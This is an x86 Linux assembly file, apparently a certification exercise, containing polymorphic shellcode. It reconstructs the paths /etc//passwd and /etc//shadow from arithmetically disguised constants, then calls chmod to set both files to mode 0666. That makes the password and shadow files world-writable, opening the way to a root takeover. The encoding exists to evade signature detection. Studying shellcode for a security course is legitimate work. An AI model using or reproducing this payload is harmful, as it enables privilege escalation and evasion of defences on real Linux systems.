;This code has been created for completing the requirements of the SecurityTube Linux Assembly Expertcertification: 	
;http://securitytube-­training.com/online-courses/securitytube-linux-assembly-expert/  
Student ID: SLAE-1537
;

global _start			

section .text
_start:


	xor eax,eax
	mov cx,0x1b6
	;push eax
	mov [esp-4], eax

	;instead of push dword 0x64777373
	mov dword [esp-8], 0x3B2E9C49 	

	;instead of push dword 0x61702f2f
	mov dword [esp-12], 0x79BDC4E2

	;instead of push dword 0x6374652f
	mov dword [esp-16], 0x3A2B8E05

	sub esp, 16

	; BRINGING BACK THE STRING
	add [esp+8], dword 0x2948d72a
	sub [esp+4], dword 0x184d95b3 
	add [esp], dword 0x2948d72a 

	mov ebx,esp
	mov al,0xa
	add al, 5
	int 0x80
	xor eax,eax
	push eax
	;instead of push dword 0x776f6461
	push dword 0x1E36F9E2
	add dword [esp], 0x59386a7f 

	;instead of push dword 0x68732f2f
	push dword 0x4F3B8600
	add [esp], dword 0x1937a92f 

	;push dword 0x6374652f
	push dword 0x3A2B8E05
	add [esp], dword 0x2948d72a

	mov ebx,esp

	; instead of mov al, 0xf, SYSCALL NUMBER for chmod
	mov al,0x1c
	sub al, 0xd
	int 0x80
	xor eax,eax
	inc eax
	int 0x80









